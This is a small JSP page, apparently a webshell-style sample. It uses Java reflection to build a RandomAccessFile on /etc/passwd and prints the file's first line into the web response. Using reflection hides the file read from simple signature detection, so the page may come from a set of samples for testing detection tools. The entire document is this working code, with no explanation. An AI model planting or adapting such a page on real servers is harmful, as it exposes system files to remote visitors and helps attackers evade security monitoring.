<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = Class.forName("java.io.RandomAccessFile");
    Constructor constructor = clazz.getDeclaredConstructor(File.class, String.class);
    Object randomAccessFile = constructor.newInstance(new File("/etc/passwd"), "r");
    String line = (String) clazz.getDeclaredMethod("readLine").invoke(randomAccessFile);

    out.println(line);
    out.flush();
%>